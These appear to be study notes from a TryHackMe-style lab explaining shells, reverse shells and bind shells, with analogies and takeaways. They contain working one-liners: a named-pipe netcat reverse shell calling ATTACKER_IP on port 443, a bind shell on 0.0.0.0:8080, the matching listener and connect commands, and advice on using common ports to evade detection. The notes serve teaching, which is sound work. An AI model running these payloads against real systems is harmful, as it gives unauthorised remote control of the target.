### **Shells**


#### **What is a Shell?**
- A **shell** is software that allows users to interact with an operating system (OS).
  - Can be **graphical** (GUI) or **command-line-based** (CLI).
  - In cybersecurity, a shell often refers to a **command-line interface** used by attackers to control compromised systems.

#### **Key Activities Enabled by Shells**
| Activity                  | Description                                                                 |
|---------------------------|-----------------------------------------------------------------------------|
| **Remote System Control** | Execute commands or run programs on the target system.                     |
| **Privilege Escalation**  | Explore vulnerabilities to gain higher privileges (e.g., root or admin).   |
| **Data Exfiltration**     | Search for and steal sensitive data (e.g., files, credentials).            |
| **Persistence**           | Maintain long-term access by creating backdoors or hidden accounts.        |
| **Post-Exploitation**     | Perform malicious activities like deploying malware or deleting evidence.  |
| **Pivoting**              | Use the compromised system to attack other systems on the network.         |


#### **Types of Shells**
Shells can vary based on how they are accessed and their capabilities:
1. **Reverse Shell**: The target system connects back to the attacker's machine.
2. **Bind Shell**: The target system opens a port and waits for the attacker to connect.
3. **Interactive Shell**: Allows full interaction with the system (e.g., running commands, navigating directories).
4. **Non-Interactive Shell**: Limited functionality, often used for specific tasks.


#### **-----**
Imagine a **shell** as a **remote control** for a compromised system:
- The attacker uses the remote control (**shell**) to:
  - Turn on/off features (**run commands**).
  - Unlock doors (**escalate privileges**).
  - Steal valuables (**exfiltrate data**).
  - Hide secret keys (**maintain access**).
  - Use the house as a base to break into neighboring houses (**pivot to other systems**).


#### **Key Takeaways**
1. **Shells Enable Control**: They allow attackers to interact with and control compromised systems.
2. **Types of Shells Matter**: Reverse shells and bind shells are common in attacks.
3. **Post-Exploitation is Key**: Shells are just the starting point for deeper attacks.
4. **Limit Shell Access**: Defenders should restrict shell access and monitor for suspicious activity.

---
---


### **Reverse Shells**

#### **What is a Reverse Shell?**
- A **reverse shell** is a technique where the **target system** initiates a connection back to the **attacker's machine**, allowing the attacker to gain control of the target.
- It is called "reverse" because the connection flows from the target to the attacker, bypassing firewalls and security measures that block incoming connections.


#### **Why Use Reverse Shells?**
- **Bypass Firewalls**: Many firewalls block incoming connections but allow outgoing connections. Reverse shells exploit this by having the target connect to the attacker.
- **Blend with Legitimate Traffic**: Attackers often use common ports (e.g., 80, 443) to disguise malicious traffic as normal web traffic.
- **Remote Access**: Allows attackers to execute commands and interact with the target system as if they were logged in locally.

#### **How Reverse Shells Work**
1. **Set Up a Listener**:
   - The attacker uses tools like **Netcat** (`nc`) to listen for incoming connections.
   - Example Command:
     ```bash
     nc -lvnp 443
     ```
     - `-l`: Listen for incoming connections.
     - `-v`: Verbose mode (shows detailed output).
     - `-n`: Disable DNS lookups (uses IP addresses directly).
     - `-p`: Specifies the port to listen on (e.g., `443`).

2. **Execute a Reverse Shell Payload**:
   - The attacker runs a payload on the target system to initiate the reverse shell.
   - Example Payload:
     ```bash
     rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP 443 >/tmp/f
     ```
     - **Breakdown**:
       1. `rm -f /tmp/f`: Removes any existing named pipe to avoid conflicts.
       2. `mkfifo /tmp/f`: Creates a named pipe for communication.
       3. `cat /tmp/f`: Reads data from the named pipe.
       4. `| sh -i 2>&1`: Pipes input to an interactive shell (`sh`), redirecting errors to standard output.
       5. `| nc ATTACKER_IP 443`: Sends the shell's output to the attacker's IP on port `443`.
       6. `>/tmp/f`: Sends the output back into the named pipe for bidirectional communication.

3. **Attacker Receives the Shell**:
   - Once the payload is executed, the attacker gains access to the target system via the reverse shell.
   - Example Output:
     ```
     connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964
     target@tryhackme:~$
     ```

#### **Key Points**
| Component          | Description                                                                 |
|--------------------|-----------------------------------------------------------------------------|
| **Listener**       | The attacker sets up a listener using tools like Netcat (`nc`).            |
| **Payload**        | A script or command executed on the target to initiate the reverse shell.  |
| **Ports**          | Common ports like `80`, `443`, or `53` are used to blend with legitimate traffic. |
| **Bidirectional**  | Reverse shells allow both sending commands and receiving output.           |


#### **Story to Remember**
Imagine a **reverse shell** as a **spy radio**:
- The spy (target system) sends a signal back to the spy agency (attacker's machine).
- The spy agency listens for the signal using a **radio receiver** (`nc -lvnp`).
- Once the connection is established, the spy agency can send commands and receive updates from the spy.


#### **Key Takeaways**
1. **Reverse Shells Bypass Firewalls**: They work by initiating the connection from the target to the attacker.
2. **Common Ports Help Avoid Detection**: Use ports like `80`, `443`, or `53` to blend with normal traffic.
3. **Payloads Vary by OS and Tools**: Different payloads are used depending on the target system and available tools.
4. **Interactive Control**: Reverse shells allow attackers to run commands and interact with the target system.

---
---



### **Bind Shells**

#### **What is a Bind Shell?**
- A **bind shell** is a technique where the **target system** opens a port and listens for incoming connections from the attacker.
- Once the attacker connects to the open port, they gain access to a shell session on the target system.


#### **Why Use Bind Shells?**
- **Useful When Outgoing Connections Are Blocked**: If the target system cannot initiate outgoing connections (e.g., due to firewall rules), a bind shell allows the attacker to connect directly to the target.
- **Less Common**: Bind shells are less popular than reverse shells because they are easier to detect since the target actively listens for connections.


#### **How Bind Shells Work**
1. **Set Up the Bind Shell on the Target**:
   - The attacker runs a command on the target machine to create a bind shell.
   - Example Command:
     ```bash
     rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
     ```
     - **Breakdown**:
       1. `rm -f /tmp/f`: Removes any existing named pipe to avoid conflicts.
       2. `mkfifo /tmp/f`: Creates a named pipe for communication.
       3. `cat /tmp/f`: Reads data from the named pipe.
       4. `| bash -i 2>&1`: Pipes input to an interactive shell (`bash`), redirecting errors to standard output.
       5. `| nc -l 0.0.0.0 8080`: Starts Netcat in listen mode (`-l`) on all interfaces (`0.0.0.0`) and port `8080`.
       6. `>/tmp/f`: Sends the output back into the named pipe for bidirectional communication.

2. **Attacker Connects to the Bind Shell**:
   - The attacker uses tools like **Netcat** (`nc`) to connect to the target's open port.
   - Example Command:
     ```bash
     nc -nv TARGET_IP 8080
     ```
     - `-n`: Disables DNS resolution (uses IP addresses directly).
     - `-v`: Verbose mode (shows detailed connection information).
     - `TARGET_IP`: The IP address of the target machine.
     - `8080`: The port number where the bind shell is listening.

3. **Attacker Gains Access**:
   - Once connected, the attacker receives a shell session on the target system.
   - Example Output:
     ```
     (UNKNOWN) [10.10.13.37] 8080 (http-alt) open
     target@tryhackme:~$
     ```

#### **Key Points**
| Component          | Description                                                                 |
|--------------------|-----------------------------------------------------------------------------|
| **Bind Shell Setup** | The target listens for incoming connections on a specific port.           |
| **Listener**       | The target uses tools like Netcat (`nc`) to listen for connections.        |
| **Ports**          | Ports below `1024` require elevated privileges, so higher ports (e.g., `8080`) are often used. |
| **Connection**     | The attacker connects to the target's open port to gain shell access.      |


#### **-----**
Imagine a **bind shell** as a **doorbell**:
- The target system sets up a doorbell (`nc -l 0.0.0.0 8080`) and waits for someone to ring it.
- The attacker rings the doorbell (`nc -nv TARGET_IP 8080`) to gain access.
- Once the doorbell is rung, the target opens the door, allowing the attacker to enter and interact with the system.


#### **Key Takeaways**
1. **Bind Shells Listen for Connections**: The target opens a port and waits for the attacker to connect.
2. **Use Higher Ports**: Avoid using ports below `1024` to bypass privilege requirements.
3. **Easier to Detect**: Since the target actively listens for connections, bind shells are more likely to be detected by security tools.
4. **Interactive Control**: Once connected, the attacker can execute commands and interact with the target system.

---
---



